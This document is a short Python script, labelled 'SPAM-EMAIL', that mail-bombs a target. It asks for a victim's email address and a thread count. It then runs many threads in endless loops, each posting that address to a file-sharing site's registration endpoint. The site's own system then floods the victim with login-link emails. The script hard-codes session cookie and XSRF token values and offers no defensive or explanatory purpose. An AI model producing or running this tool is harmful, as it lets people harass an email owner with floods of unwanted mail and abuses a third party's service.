import threading
from requests import post
print("""
███████╗██████╗  █████╗ ███╗   ███╗      ███████╗███╗   ███╗ █████╗ ██╗██╗     
██╔════╝██╔══██╗██╔══██╗████╗ ████║      ██╔════╝████╗ ████║██╔══██╗██║██║     
███████╗██████╔╝███████║██╔████╔██║█████╗█████╗  ██╔████╔██║███████║██║██║     
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║╚════╝██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     
███████║██║     ██║  ██║██║ ╚═╝ ██║      ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝      ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                                
                            By @TweakPY - @vv1ck                                
""")
email=input('- The Email : ')
Thread=int(input('- Thread : ')) #Phone from 10 to 80 || PC computer from 100 to 900 as you Like ..
print("- - - - - - Started - - - - - -")
def Spam_Email():  
    try: 
        while 5283:
            r=post("https://www.filesharing.com/register",headers={'Host': 'www.filesharing.com','Cookie': 'filehostingorg_session=eyJpdiI6ImY4K0FEZGZ0Y3Z5ZFlFWXN5NUNMVkE9PSIsInZhbHVlIjoiM3Z5U3dtT3VNSkUrSlp1ckFkU0hhV0U0UVdrZGcybHdlbGdkNmRYelBIR0RvWkRpZURlSVZmVFBPWXU5RzRwYmJsekhZSDI1b3ZtTFA1eFJoOEtBMUFiVFNuSGNORm5wQ2g0dURPSXNhcVhCdGRRQzBUbVhKdzlnVCtBbU9ySGQiLCJtYWMiOiJhOWU2MGJiNDFkZTVlNGUxMDA4NzQ2ZTdkYjEzYzc0ZGNjZjk5MjEzZGI4ZjI0NzIyMmFmN2U3ZTUzYzg5NjMzIiwidGFnIjoiIn0%3D','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0','Accept': 'text/html, application/xhtml+xml','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/json','X-Inertia': 'true','X-Inertia-Version': '5ccb32daf9a9dc80ffd5c2d627aca53b','X-Xsrf-Token': 'eyJpdiI6Ik5pUG1nT1BOREUwOXRYUUtVekhsOHc9PSIsInZhbHVlIjoicmgvaXJXd3JFRDRSR2oweFlpY2NCYTVyTlJwWHFBSVZzY2dSdjVpdTFtcW5DMlpRdDdRS3Ribng5QjZ1MVJaMnFqbVlBTWwrUUlieTJvc0xCSE5HalpUdlNpaWh6Q3lwTnp3ckN3cjArSUU3Q1JURTcwT3VyTXpZTnZQclduNGUiLCJtYWMiOiI2ZTkxNzIwMzlhZGJkNTdiYzg5NTg4NzRkNWUzZjJhODM3OTI3MzlmOWIxZDQ2YmNiNGIwZjMxNzc1MGQ5OGVlIiwidGFnIjoiIn0=','Content-Length': '184','Origin': 'https://www.filesharing.com','Referer': 'https://www.filesharing.com/login','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers','Connection': 'close'},json={'email':email,'isDirty':'true','errors':'{}','hasErrors':'false','processing':'false','progress':'null','wasSuccessful':'false','recentlySuccessful':'false','__rememberable':'true'})
            if 'We have sent you an email with a link to login.' in r.text:print(f'- Sent ')
            else:print(f'- Error Send ')
    except:pass
for FZ in range(int(Thread)):
	t=threading.Thread(target=Spam_Email)
	t.start()
